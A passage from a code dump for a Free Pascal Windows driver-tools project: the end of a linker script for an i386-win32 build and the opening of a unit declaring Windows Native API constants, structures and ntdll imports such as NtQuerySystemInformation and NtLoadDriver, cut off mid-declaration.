C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\libimpfpintres.a
C:\Work\DrvTools\lib\i386-win32\libimpnativesup.a
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\libimpwindows.a
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\libimpsysutils.a
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\libimpwindirs.a
C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-base\libimpshlobj.a
C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-base\libimpactivex.a
C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-base\libimpshellapi.a
C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-base\libimpcommctrl.a
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl-objpas\libimpvarutils.a
C:\lazarus\fpc\3.2.0\units\i386-win32\rtl\libimpdos.a
C:\lazarus\lcl\units\i386-win32\libimplclintf.a
C:\lazarus\lcl\units\i386-win32\win32\libimpwin32int.a
C:\lazarus\lcl\units\i386-win32\win32\libimpwin32extra.a
C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-base\libimpcommdlg.a
C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-jedi\libimpjwawinsvc.a
C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-jedi\libimpjwawinnt.a
C:\lazarus\fpc\3.2.0\units\i386-win32\winunits-jedi\libimpjwawintype.a
)
SEARCH_DIR("/usr/i686-pc-cygwin/lib"); SEARCH_DIR("/usr/lib"); SEARCH_DIR("/usr/lib/w32api");
OUTPUT_FORMAT(pei-i386)
ENTRY(_mainCRTStartup)
SECTIONS
{
  . = SIZEOF_HEADERS;
  . = ALIGN(__section_alignment__);
  .text  __image_base__ + ( __section_alignment__ < 0x1000 ? . : __section_alignment__ ) :
  {
    __text_start__ = . ;
    *(.init)
    *(.text .stub .text.* .gnu.linkonce.t.*)
    *(SORT(.text$*))
    *(.glue_7t)
    *(.glue_7)
    . = ALIGN(8);
     ___CTOR_LIST__ = .; __CTOR_LIST__ = . ;
    LONG (-1);
    *(.ctors); *(.ctor); *(SORT(.ctors.*));  LONG (0);
     ___DTOR_LIST__ = .; __DTOR_LIST__ = . ;
    LONG (-1);
    *(.dtors); *(.dtor); *(SORT(.dtors.*));  LONG (0);
     *(.fini)
    PROVIDE (etext = .);
    *(.gcc_except_table)
  }
  .data BLOCK(__section_alignment__) :
  {
    __data_start__ = . ;
    *(.data .data.* .gnu.linkonce.d.* .fpc*)
    *(.data2)
    *(SORT(.data$*))
    *(.jcr)
    PROVIDE (__tls_index = .);
    LONG (0);
    __data_end__ = . ;
    *(.data_cygwin_nocopy)
  }
  .rdata BLOCK(__section_alignment__) :
  {
    *(.rdata)
    *(.rdata.*)
    *(.rodata .rodata.* .gnu.linkonce.r.*)
    *(SORT(.rdata$*))
    *(.eh_frame)
    ___RUNTIME_PSEUDO_RELOC_LIST__ = .;
    __RUNTIME_PSEUDO_RELOC_LIST__ = .;
    *(.rdata_runtime_pseudo_reloc)
    ___RUNTIME_PSEUDO_RELOC_LIST_END__ = .;
    __RUNTIME_PSEUDO_RELOC_LIST_END__ = .;
  }
  .pdata BLOCK(__section_alignment__) : { *(.pdata) }
  .bss BLOCK(__section_alignment__) :
  {
    __bss_start__ = . ;
    *(.bss .bss.* .gnu.linkonce.b.*)
    *(SORT(.bss$*))
    *(COMMON)
    __bss_end__ = . ;
  }
  .edata BLOCK(__section_alignment__) : { *(.edata) }
  .idata BLOCK(__section_alignment__) :
  {
    SORT(*)(.idata$2)
    SORT(*)(.idata$3)
    /* These zeroes mark the end of the import list.  */
    LONG (0); LONG (0); LONG (0); LONG (0); LONG (0);
    SORT(*)(.idata$4)
    SORT(*)(.idata$5)
    SORT(*)(.idata$6)
    SORT(*)(.idata$7)
  }
  .CRT BLOCK(__section_alignment__) :
  {
    ___crt_xc_start__ = . ;
    *(SORT(.CRT$XC*))  /* C initialization */
    ___crt_xc_end__ = . ;
    ___crt_xi_start__ = . ;
    *(SORT(.CRT$XI*))  /* C++ initialization */
    ___crt_xi_end__ = . ;
    ___crt_xl_start__ = . ;
    *(SORT(.CRT$XL*))  /* TLS callbacks */
    /* ___crt_xl_end__ is defined in the TLS Directory support code */
    PROVIDE (___crt_xl_end__ = .);
    ___crt_xp_start__ = . ;
    *(SORT(.CRT$XP*))  /* Pre-termination */
    ___crt_xp_end__ = . ;
    ___crt_xt_start__ = . ;
    *(SORT(.CRT$XT*))  /* Termination */
    ___crt_xt_end__ = . ;
  }
  .tls BLOCK(__section_alignment__) :
  {
    ___tls_start__ = . ;
    *(.tls .tls.*)
    *(.tls$)
    *(SORT(.tls$*))
    ___tls_end__ = . ;
  }
  .rsrc BLOCK(__section_alignment__) :
  {
    *(.rsrc)
    *(SORT(.rsrc$*))
  }
  .reloc BLOCK(__section_alignment__) : { *(.reloc) }
  .stab BLOCK(__section_alignment__) (NOLOAD) : { *(.stab) }
  .stabstr BLOCK(__section_alignment__) (NOLOAD) : { *(.stabstr) }
  .debug_aranges BLOCK(__section_alignment__) (NOLOAD) : { *(.debug_aranges) }
  .debug_pubnames BLOCK(__section_alignment__) (NOLOAD) : { *(.debug_pubnames) }
  .debug_info BLOCK(__section_alignment__) (NOLOAD) : { *(.debug_info) *(.gnu.linkonce.wi.*) }
  .debug_abbrev BLOCK(__section_alignment__) (NOLOAD) : { *(.debug_abbrev) }
  .debug_line BLOCK(__section_alignment__) (NOLOAD) : { *(.debug_line) }
  .debug_frame BLOCK(__section_alignment__) (NOLOAD) : { *(.debug_frame) }
  .debug_str BLOCK(__section_alignment__) (NOLOAD) : { *(.debug_str) }
  .debug_loc BLOCK(__section_alignment__) (NOLOAD) : { *(.debug_loc) }
  .debug_macinfo BLOCK(__section_alignment__) (NOLOAD) : { *(.debug_macinfo) }
  .debug_weaknames BLOCK(__section_alignment__) (NOLOAD) : { *(.debug_weaknames) }
  .debug_funcnames BLOCK(__section_alignment__) (NOLOAD) : { *(.debug_funcnames) }
  .debug_typenames BLOCK(__section_alignment__) (NOLOAD) : { *(.debug_typenames) }
  .debug_varnames BLOCK(__section_alignment__) (NOLOAD) : { *(.debug_varnames) }
  .debug_ranges BLOCK(__section_alignment__) (NOLOAD) : { *(.debug_ranges) }
}

```

`source/DrvTools/src/nativesup.pas`:

```pas
{*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2021 - 2022
*
*  TITLE:       nativesup.pas
*
*  VERSION:     1.01
*
*  DATE:        27 Mar 2022
*
*  Windows Native API support routines.
*  ObjFPC variant, based on Win32Pascal WinNative of v1.43
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************}
unit nativesup;

{$mode objfpc}{$H+}

interface

uses
  Windows, SysUtils;

{$calling stdcall}

const
  ntdll = 'ntdll.dll';
  win32u = 'win32u.dll';
  ntoskrnl = 'ntoskrnl.exe';
  hal = 'hal.dll';

  OBJECT_TYPE_DIRECTORY = 'Directory';
  OBJECT_TYPE_DEVICE = 'Device';
  OBJECT_TYPE_SYMLINK = 'SymbolicLink';

  NT_REGISTRY_MACHINE = '\Registry\Machine';
  NT_PATH_PREFIX = '\??\';
  NT_SYSTEM_ROOT = '\SystemRoot';
  WIN32_CURRENTCONTROL_SERVICES = 'System\CurrentControlSet\Services\%S';

  NtCurrentProcess = DWORD(-1);
  NtCurrentThread = DWORD(-2);

  SECURITY_NT_AUTHORITY: array[0..5] of byte = (0, 0, 0, 0, 0, 5);

  SE_GROUP_USE_FOR_DENY_ONLY = $00000010;

  {privileges}

  SE_MIN_WELL_KNOWN_PRIVILEGE = 2;
  SE_CREATE_TOKEN_PRIVILEGE = 2;
  SE_ASSIGNPRIMARYTOKEN_PRIVILEGE = 3;
  SE_LOCK_MEMORY_PRIVILEGE = 4;
  SE_INCREASE_QUOTA_PRIVILEGE = 5;
  SE_MACHINE_ACCOUNT_PRIVILEGE = 6;
  SE_TCB_PRIVILEGE = 7;
  SE_SECURITY_PRIVILEGE = 8;
  SE_TAKE_OWNERSHIP_PRIVILEGE = 9;
  SE_LOAD_DRIVER_PRIVILEGE = 10;
  SE_SYSTEM_PROFILE_PRIVILEGE = 11;
  SE_SYSTEMTIME_PRIVILEGE = 12;
  SE_PROF_SINGLE_PROCESS_PRIVILEGE = 13;
  SE_INC_BASE_PRIORITY_PRIVILEGE = 14;
  SE_CREATE_PAGEFILE_PRIVILEGE = 15;
  SE_CREATE_PERMANENT_PRIVILEGE = 16;
  SE_BACKUP_PRIVILEGE = 17;
  SE_RESTORE_PRIVILEGE = 18;
  SE_SHUTDOWN_PRIVILEGE = 19;
  SE_DEBUG_PRIVILEGE = 20;
  SE_AUDIT_PRIVILEGE = 21;
  SE_SYSTEM_ENVIRONMENT_PRIVILEGE = 22;
  SE_CHANGE_NOTIFY_PRIVILEGE = 23;
  SE_REMOTE_SHUTDOWN_PRIVILEGE = 24;
  SE_UNDOCK_PRIVILEGE = 25;
  SE_SYNC_AGENT_PRIVILEGE = 26;
  SE_ENABLE_DELEGATION_PRIVILEGE = 27;
  SE_MANAGE_VOLUME_PRIVILEGE = 28;
  SE_IMPERSONATE_PRIVILEGE = 29;
  SE_CREATE_GLOBAL_PRIVILEGE = 30;
  SE_TRUSTED_CREDMAN_ACCESS_PRIVILEGE = 31;
  SE_RELABEL_PRIVILEGE = 32;
  SE_INC_WORKING_SET_PRIVILEGE = 33;
  SE_TIME_ZONE_PRIVILEGE = 34;
  SE_CREATE_SYMBOLIC_LINK_PRIVILEGE = 35;
  SE_DELEGATE_SESSION_USER_IMPERSONATE_PRIVILEGE = 36;
  SE_MAX_WELL_KNOWN_PRIVILEGE = SE_DELEGATE_SESSION_USER_IMPERSONATE_PRIVILEGE;

  {file consts}
  FILE_SUPERSEDE = $00000000;
  FILE_OPEN = $00000001;
  FILE_CREATE = $00000002;
  FILE_OPEN_IF = $00000003;
  FILE_OVERWRITE = $00000004;
  FILE_APPEND_DATA = $00000004;
  FILE_OVERWRITE_IF = $00000005;
  FILE_MAXIMUM_DISPOSITION = $00000005;

  FILE_DIRECTORY_FILE = $00000001;
  FILE_WRITE_THROUGH = $00000002;
  FILE_SEQUENTIAL_ONLY = $00000004;
  FILE_NO_INTERMEDIATE_BUFFERING = $00000008;
  FILE_SYNCHRONOUS_IO_ALERT = $00000010;
  FILE_SYNCHRONOUS_IO_NONALERT = $00000020;
  FILE_NON_DIRECTORY_FILE = $00000040;
  FILE_CREATE_TREE_CONNECTION = $00000080;
  FILE_COMPLETE_IF_OPLOCKED = $00000100;
  FILE_NO_EA_KNOWLEDGE = $00000200;
  FILE_OPEN_FOR_RECOVERY = $00000400;
  FILE_RANDOM_ACCESS = $00000800;
  FILE_DELETE_ON_CLOSE = $00001000;
  FILE_OPEN_BY_FILE_ID = $00002000;
  FILE_OPEN_FOR_BACKUP_INTENT = $00004000;
  FILE_NO_COMPRESSION = $00008000;
  FILE_RESERVE_OPFILTER = $00100000;
  FILE_OPEN_REPARSE_POINT = $00200000;
  FILE_OPEN_NO_RECALL = $00400000;
  FILE_OPEN_FOR_FREE_SPACE_QUERY = $00800000;
  FILE_ANY_ACCESS = $00000000;
  FILE_SPECIAL_ACCESS = FILE_ANY_ACCESS;
  FILE_READ_ACCESS = $00000001;
  FILE_LIST_DIRECTORY = $0000001;
  FILE_WRITE_ACCESS = $00000002;
  FILE_READ_DATA = $00000001;
  FILE_ADD_FILE = $00000002;
  FILE_WRITE_DATA = $00000002;
  FILE_ADD_SUBDIRECTORY = $00000004;
  FILE_CREATE_PIPE_INSTANCE = $00000004;
  FILE_READ_EA = $00000008;
  FILE_WRITE_EA = $00000010;
  FILE_EXECUTE = $00000020;
  FILE_TRAVERSE = $00000020;
  FILE_DELETE_CHILD = $00000040;
  FILE_READ_ATTRIBUTES = $00000080;
  FILE_WRITE_ATTRIBUTES = $00000100;
  FILE_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED or SYNCHRONIZE or $1FF);

  FILE_GENERIC_READ = (STANDARD_RIGHTS_READ or FILE_READ_DATA or
    FILE_READ_ATTRIBUTES or FILE_READ_EA or SYNCHRONIZE);

  FILE_GENERIC_WRITE = (STANDARD_RIGHTS_WRITE or FILE_WRITE_DATA or
    FILE_WRITE_ATTRIBUTES or FILE_WRITE_EA or FILE_APPEND_DATA or SYNCHRONIZE);

  FILE_ATTRIBUTE_READONLY = $00000001;
  FILE_ATTRIBUTE_HIDDEN = $00000002;
  FILE_ATTRIBUTE_SYSTEM = $00000004;
  FILE_ATTRIBUTE_DIRECTORY = $00000010;
  FILE_ATTRIBUTE_ARCHIVE = $00000020;
  FILE_ATTRIBUTE_DEVICE = $00000040;
  FILE_ATTRIBUTE_NORMAL = $00000080;
  FILE_ATTRIBUTE_TEMPORARY = $00000100;
  FILE_ATTRIBUTE_SPARSE_FILE = $00000200;
  FILE_ATTRIBUTE_REPARSE_POINT = $00000400;
  FILE_ATTRIBUTE_COMPRESSED = $00000800;
  FILE_ATTRIBUTE_OFFLINE = $00001000;
  FILE_ATTRIBUTE_NOT_CONTENT_INDEXED = $00002000;
  FILE_ATTRIBUTE_ENCRYPTED = $00004000;

  {object attributes}
  OBJ_INHERIT = $00000002;
  OBJ_PERMANENT = $00000010;
  OBJ_EXCLUSIVE = $00000020;
  OBJ_CASE_INSENSITIVE = $00000040;
  OBJ_OPENIF = $00000080;
  OBJ_OPENLINK = $00000100;
  OBJ_KERNEL_HANDLE = $00000200;

  {symlink desired access}
  SYMBOLIC_LINK_QUERY = $1;
  SYMBOLIC_LINK_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED or SYMBOLIC_LINK_QUERY);

  {directory object desired access}
  DIRECTORY_QUERY = $0001;
  DIRECTORY_TRAVERSE = $0002;
  DIRECTORY_CREATE_OBJECT = $0004;
  DIRECTORY_CREATE_SUBDIRECTORY = $0008;
  DIRECTORY_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED or DIRECTORY_QUERY or
    DIRECTORY_TRAVERSE or DIRECTORY_CREATE_OBJECT or DIRECTORY_CREATE_SUBDIRECTORY);

{begin shitty borland modules definitions workaround}
type
  PFNREADFILEPROC = function(hFile: THandle; lpBuffer: pointer;
    nNumberOfBytesToRead: DWORD; lpNumberOfBytesRead: PDWORD;
    lpOverlapped: POVERLAPPED): BOOL; stdcall;

  PFNWRITEFILEPROC = function(hFile: THandle; lpBuffer: pointer;
    nNumberOfBytesToWrite: DWORD; lpNumberOfBytesWritten: PDWORD;
    lpOverlapped: POVERLAPPED): BOOL; stdcall;

const
  pp1: pointer = @Windows.ReadFile;
  pp2: pointer = @Windows.WriteFile;

var
  _ReadFile: PFNREADFILEPROC absolute pp1;
  _WriteFile: PFNWRITEFILEPROC absolute pp2;
{end of shitty borland modules definitions workaround}

type
  NTSTATUS = LONG;
  UCHAR = byte;
  PUCHAR = ^byte;
  USHORT = word;
  PUSHORT = ^word;
  ULONG = longword;
  PULONG = PLongWord;
  PCUCHAR = ^UCHAR; { const }
  PCUSHORT = ^USHORT; { const }
  PCULONG = ^ULONG; { const }

{$i ntstatus.inc}

function RegDeleteTreeW(hKey: HKEY; lpSubKey: LPCWSTR): LONG;
  external 'advapi32' Name 'RegDeleteTreeW';

type
  _ANSI_STRING = record
    Length: word;
    MaximumLength: word;
    Buffer: PAnsiChar;
  end;
  ANSI_STRING = _ANSI_STRING;
  PANSI_STRING = ^_ANSI_STRING;

  _UNICODE_STRING = record
    Length: word;
    MaximumLength: word;
    Buffer: PWideChar;
  end;
  UNICODE_STRING = _UNICODE_STRING;
  PUNICODE_STRING = ^_UNICODE_STRING;
  PCUNICODE_STRING = ^_UNICODE_STRING;

  _CURDIR = record
    DosPath: UNICODE_STRING;
    Handle: THANDLE;
  end;
  CURDIR = _CURDIR;
  PCURDIR = ^_CURDIR;

  _IO_STATUS_BLOCK = record
    Status: NTSTATUS;
    uInformation: ULONG;
  end;
  IO_STATUS_BLOCK = _IO_STATUS_BLOCK;
  PIO_STATUS_BLOCK = ^_IO_STATUS_BLOCK;

  _OBJECT_ATTRIBUTES = record
    Length: ULONG;
    RootDirectory: THandle;
    ObjectName: PUNICODE_STRING;
    Attributes: ULONG;
    SecurityDescriptor: Pointer; // Points to type SECURITY_DESCRIPTOR
    SecurityQualityOfService: Pointer; // Points to type SECURITY_QUALITY_OF_SERVICE
  end;
  OBJECT_ATTRIBUTES = _OBJECT_ATTRIBUTES;
  POBJECT_ATTRIBUTES = ^_OBJECT_ATTRIBUTES;

  PIO_APC_ROUTINE = procedure(ApcContext: pointer; IoStatusBlock: PIO_STATUS_BLOCK;
    Reserved: cardinal);

type
  _SYSTEM_INFORMATION_CLASS = (
    SystemBasicInformation = 0,
    SystemProcessorInformation = 1,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemPathInformation = 4,
    SystemProcessInformation = 5,
    SystemCallCountInformation = 6,
    SystemDeviceInformation = 7,
    SystemProcessorPerformanceInformation = 8,
    SystemFlagsInformation = 9,
    SystemCallTimeInformation = 10,
    SystemModuleInformation = 11,
    SystemLocksInformation = 12,
    SystemStackTraceInformation = 13,
    SystemPagedPoolInformation = 14,
    SystemNonPagedPoolInformation = 15,
    SystemHandleInformation = 16,
    SystemObjectInformation = 17,
    SystemPageFileInformation = 18,
    SystemVdmInstemulInformation = 19,
    SystemVdmBopInformation = 20,
    SystemFileCacheInformation = 21,
    SystemPoolTagInformation = 22,
    SystemInterruptInformation = 23,
    SystemDpcBehaviorInformation = 24,
    SystemFullMemoryInformation = 25,
    SystemLoadGdiDriverInformation = 26,
    SystemUnloadGdiDriverInformation = 27,
    SystemTimeAdjustmentInformation = 28,
    SystemSummaryMemoryInformation = 29,
    SystemMirrorMemoryInformation = 30,
    SystemPerformanceTraceInformation = 31,
    SystemObsolete0 = 32,
    SystemExceptionInformation = 33,
    SystemCrashDumpStateInformation = 34,
    SystemKernelDebuggerInformation = 35,
    SystemContextSwitchInformation = 36,
    SystemRegistryQuotaInformation = 37,
    SystemExtendServiceTableInformation = 38,
    SystemPrioritySeperation = 39,
    SystemVerifierAddDriverInformation = 40,
    SystemVerifierRemoveDriverInformation = 41,
    SystemProcessorIdleInformation = 42,
    SystemLegacyDriverInformation = 43,
    SystemCurrentTimeZoneInformation = 44,
    SystemLookasideInformation = 45,
    SystemTimeSlipNotification = 46,
    SystemSessionCreate = 47,
    SystemSessionDetach = 48,
    SystemSessionInformation = 49,
    SystemRangeStartInformation = 50,
    SystemVerifierInformation = 51,
    SystemVerifierThunkExtend = 52,
    SystemSessionProcessInformation = 53,
    SystemLoadGdiDriverInSystemSpace = 54,
    SystemNumaProcessorMap = 55,
    SystemPrefetcherInformation = 56,
    SystemExtendedProcessInformation = 57,
    SystemRecommendedSharedDataAlignment = 58,
    SystemComPlusPackage = 59,
    SystemNumaAvailableMemory = 60,
    SystemProcessorPowerInformation = 61,
    SystemEmulationBasicInformation = 62,
    SystemEmulationProcessorInformation = 63,
    SystemExtendedHandleInformation = 64,
    SystemLostDelayedWriteInformation = 65,
    SystemBigPoolInformation = 66,
    SystemSessionPoolTagInformation = 67,
    SystemSessionMappedViewInformation = 68,
    SystemHotpatchInformation = 69,
    SystemObjectSecurityMode = 70,
    SystemWatchdogTimerHandler = 71,
    SystemWatchdogTimerInformation = 72,
    SystemLogicalProcessorInformation = 73,
    SystemWow64SharedInformationObsolete = 74,
    SystemRegisterFirmwareTableInformationHandler = 75,
    SystemFirmwareTableInformation = 76,
    SystemModuleInformationEx = 77,
    SystemVerifierTriageInformation = 78,
    SystemSuperfetchInformation = 79,
    SystemMemoryListInformation = 80,
    SystemFileCacheInformationEx = 81,
    SystemThreadPriorityClientIdInformation = 82,
    SystemProcessorIdleCycleTimeInformation = 83,
    SystemVerifierCancellationInformation = 84,
    SystemProcessorPowerInformationEx = 85,
    SystemRefTraceInformation = 86,
    SystemSpecialPoolInformation = 87,
    SystemProcessIdInformation = 88,
    SystemErrorPortInformation = 89,
    SystemBootEnvironmentInformation = 90,
    SystemHypervisorInformation = 91,
    SystemVerifierInformationEx = 92,
    SystemTimeZoneInformation = 93,
    SystemImageFileExecutionOptionsInformation = 94,
    SystemCoverageInformation = 95,
    SystemPrefetchPatchInformation = 96,
    SystemVerifierFaultsInformation = 97,
    SystemSystemPartitionInformation = 98,
    SystemSystemDiskInformation = 99,
    SystemProcessorPerformanceDistribution = 100,
    SystemNumaProximityNodeInformation = 101,
    SystemDynamicTimeZoneInformation = 102,
    SystemCodeIntegrityInformation = 103,
    SystemProcessorMicrocodeUpdateInformation = 104,
    SystemProcessorBrandString = 105,
    SystemVirtualAddressInformation = 106,
    SystemLogicalProcessorAndGroupInformation = 107,
    SystemProcessorCycleTimeInformation = 108,
    SystemStoreInformation = 109,
    SystemRegistryAppendString = 110,
    SystemAitSamplingValue = 111,
    SystemVhdBootInformation = 112,
    SystemCpuQuotaInformation = 113,
    SystemNativeBasicInformation = 114,
    SystemErrorPortTimeouts = 115,
    SystemLowPriorityIoInformation = 116,
    SystemBootEntropyInformation = 117,
    SystemVerifierCountersInformation = 118,
    SystemPagedPoolInformationEx = 119,
    SystemSystemPtesInformationEx = 120,
    SystemNodeDistanceInformation = 121,
    SystemAcpiAuditInformation = 122,
    SystemBasicPerformanceInformation = 123,
    SystemQueryPerformanceCounterInformation = 124,
    SystemSessionBigPoolInformation = 125,
    SystemBootGraphicsInformation = 126,
    SystemScrubPhysicalMemoryInformation = 127,
    SystemBadPageInformation = 128,
    SystemProcessorProfileControlArea = 129,
    SystemCombinePhysicalMemoryInformation = 130,
    SystemEntropyInterruptTimingInformation = 131,
    SystemConsoleInformation = 132,
    SystemPlatformBinaryInformation = 133,
    SystemPolicyInformation = 134,
    SystemHypervisorProcessorCountInformation = 135,
    SystemDeviceDataInformation = 136,
    SystemDeviceDataEnumerationInformation = 137,
    SystemMemoryTopologyInformation = 138,
    SystemMemoryChannelInformation = 139,
    SystemBootLogoInformation = 140,
    SystemProcessorPerformanceInformationEx = 141,
    SystemSpare0 = 142,
    SystemSecureBootPolicyInformation = 143,
    SystemPageFileInformationEx = 144,
    SystemSecureBootInformation = 145,
    SystemEntropyInterruptTimingRawInformation = 146,
    SystemPortableWorkspaceEfiLauncherInformation = 147,
    SystemFullProcessInformation = 148,
    SystemKernelDebuggerInformationEx = 149,
    SystemBootMetadataInformation = 150,
    SystemSoftRebootInformation = 151,
    SystemElamCertificateInformation = 152,
    SystemOfflineDumpConfigInformation = 153,
    SystemProcessorFeaturesInformation = 154,
    SystemRegistryReconciliationInformation = 155,
    SystemEdidInformation = 156,
    SystemManufacturingInformation = 157,
    SystemEnergyEstimationConfigInformation = 158,
    SystemHypervisorDetailInformation = 159,
    SystemProcessorCycleStatsInformation = 160,
    SystemVmGenerationCountInformation = 161,
    SystemTrustedPlatformModuleInformation = 162,
    SystemKernelDebuggerFlags = 163,
    SystemCodeIntegrityPolicyInformation = 164,
    SystemIsolatedUserModeInformation = 165,
    SystemHardwareSecurityTestInterfaceResultsInformation = 166,
    SystemSingleModuleInformation = 167,
    SystemAllowedCpuSetsInformation = 168,
    SystemVsmProtectionInformation = 169, //ex SystemDmaProtectionInformation
    SystemInterruptCpuSetsInformation = 170,
    SystemSecureBootPolicyFullInformation = 171,
    SystemCodeIntegrityPolicyFullInformation = 172,
    SystemAffinitizedInterruptProcessorInformation = 173,
    SystemRootSiloInformation = 174,
    SystemCpuSetInformation = 175,
    SystemCpuSetTagInformation = 176,
    SystemWin32WerStartCallout = 177,
    SystemSecureKernelProfileInformation = 178,
    SystemCodeIntegrityPlatformManifestInformation = 179,
    SystemInterruptSteeringInformation = 180,
    SystemSupportedProcessorArchitectures = 181,
    SystemMemoryUsageInformation = 182,
    SystemCodeIntegrityCertificateInformation = 183,
    SystemPhysicalMemoryInformation = 184,
    SystemControlFlowTransition = 185,
    SystemKernelDebuggingAllowed = 186,
    SystemActivityModerationExeState = 187,
    SystemActivityModerationUserSettings = 188,
    SystemCodeIntegrityPoliciesFullInformation = 189,
    SystemCodeIntegrityUnlockInformation = 190,
    SystemIntegrityQuotaInformation = 191,
    SystemFlushInformation = 192,
    SystemProcessorIdleMaskInformation = 193,
    SystemSecureDumpEncryptionInformation = 194,
    SystemWriteConstraintInformation = 195,
    SystemKernelVaShadowInformation = 196,
    SystemHypervisorSharedPageInformation = 197,
    SystemFirmwareBootPerformanceInformation = 198,
    SystemCodeIntegrityVerificationInformation = 199,
    SystemFirmwarePartitionInformation = 200,
    SystemSpeculationControlInformation = 201,
    SystemDmaGuardPolicyInformation = 202,
    SystemEnclaveLaunchControlInformation = 203,
    SystemWorkloadAllowedCpuSetsInformation = 204,
    SystemCodeIntegrityUnlockModeInformation = 205,
    SystemLeapSecondInformation = 206,
    SystemFlags2Information = 207,
    SystemSecurityModelInformation = 208,
    SystemCodeIntegritySyntheticCacheInformation = 209,
    SystemFeatureConfigurationInformation = 210,
    SystemFeatureConfigurationSectionInformation = 211,
    SystemFeatureUsageSubscriptionInformation = 212,
    SystemSecureSpeculationControlInformation = 213,
    SystemSpacesBootInformation = 214,
    SystemFwRamdiskInformation = 215,
    SystemWheaIpmiHardwareInformation = 216,
    SystemDifSetRuleClassInformation = 217,
    SystemDifClearRuleClassInformation = 218,
    SystemDifApplyPluginVerificationOnDriver = 219,
    SystemDifRemovePluginVerificationOnDriver = 220,
    SystemShadowStackInformation = 221,
    SystemBuildVersionInformation = 222,
    SystemPoolLimitInformation = 223,
    SystemCodeIntegrityAddDynamicStore = 224,
    SystemCodeIntegrityClearDynamicStores = 225,
    SystemDifPoolTrackingInformation = 226,
    SystemPoolZeroingInformation = 227,
    SystemDpcWatchdogInformation = 228,
    SystemDpcWatchdogInformation2 = 229,
    SystemSupportedProcessorArchitectures2 = 230,
    SystemSingleProcessorRelationshipInformation = 231,
    SystemXfgCheckFailureInformation = 232,
    MaxSystemInfoClass);
  SYSTEM_INFORMATION_CLASS = _SYSTEM_INFORMATION_CLASS;
  PSYSTEM_INFORMATION_CLASS = ^_SYSTEM_INFORMATION_CLASS;

type
  _OBJECT_DIRECTORY_INFORMATION = record
    Name: UNICODE_STRING;
    TypeName: UNICODE_STRING;
  end;
  OBJECT_DIRECTORY_INFORMATION = _OBJECT_DIRECTORY_INFORMATION;
  POBJECT_DIRECTORY_INFORMATION = ^_OBJECT_DIRECTORY_INFORMATION;

  _SYSTEM_HANDLE_TABLE_ENTRY_INFO = record
    UniqueProcessId: USHORT;
    CreatorBackTraceIndex: USHORT;
    ObjectTypeIndex: UCHAR;
    HandleAttributes: UCHAR;
    HandleValue: USHORT;
    ObjectPointer: PVOID;
    GrantedAccess: ACCESS_MASK;
  end;
  SYSTEM_HANDLE_TABLE_ENTRY_INFO = _SYSTEM_HANDLE_TABLE_ENTRY_INFO;
  PSYSTEM_HANDLE_TABLE_ENTRY_INFO = ^_SYSTEM_HANDLE_TABLE_ENTRY_INFO;

  _SYSTEM_HANDLE_INFORMATION = record
    NumberOfHandles: ULONG;
    Handles: array[0..0] of SYSTEM_HANDLE_TABLE_ENTRY_INFO;
  end;
  SYSTEM_HANDLE_INFORMATION = _SYSTEM_HANDLE_INFORMATION;
  PSYSTEM_HANDLE_INFORMATION = ^_SYSTEM_HANDLE_INFORMATION;

  _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX = record
    ObjectPointer: PVOID;
    UniqueProcessId: ULONG_PTR;
    HandleValue: ULONG_PTR;
    GrantedAccess: ULONG;
    CreatorBackTraceIndex: USHORT;
    ObjectTypeIndex: USHORT;
    HandleAttributes: ULONG;
    Reserved: ULONG;
  end;
  SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX = _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;
  PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX = ^_SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

  _SYSTEM_HANDLE_INFORMATION_EX = record
    NumberOfHandles: ULONG_PTR;
    Reserved: ULONG_PTR;
    Handles: array[0..0] of SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;
  end;
  SYSTEM_HANDLE_INFORMATION_EX = _SYSTEM_HANDLE_INFORMATION_EX;
  PSYSTEM_HANDLE_INFORMATION_EX = ^_SYSTEM_HANDLE_INFORMATION_EX;

procedure RtlInitUnicodeString(
  {IN} DestinationString: PUNICODE_STRING;
  {IN} const SourceString: PWideChar); stdcall; external ntdll;

function RtlEqualUnicodeString(
  {IN} String1: PCUNICODE_STRING;
  {IN} String2: PCUNICODE_STRING;
  {IN} CaseInSensitive: boolean): boolean; stdcall; external ntdll;

function NtQuerySystemInformation(
  {IN} InfoClass: SYSTEM_INFORMATION_CLASS;
  {IN} SystemInformation: PVOID;
  {IN} SystemInformationLength: DWORD;
  {OUT} ReturnLength: PULONG): NTSTATUS; stdcall; external ntdll;

function NtLoadDriver(
  {IN} DriverServiceName: PUNICODE_STRING): NTSTATUS; stdcall; external ntdll;

function NtUnloadDriver(
  {IN} DriverServiceName: PUNICODE_STRING): NTSTATUS; stdcall; external ntdll;

function NtCreateFile(
  {OUT} var FileHandle: THANDLE;
  {IN} DesiredAccess: ACCESS_MASK;
  {IN} ObjectAttributes: POBJECT_ATTRIBUTES;
  {OUT} var IoStatusBlock: IO_STATUS_BLOCK;
  {IN} AllocationSize: PLARGE_INTEGER {OPTIONAL};
  {IN} FileAttributes: ULONG;
  {IN} ShareAccess: ULONG;
  {IN} CreateDisposition: ULONG;
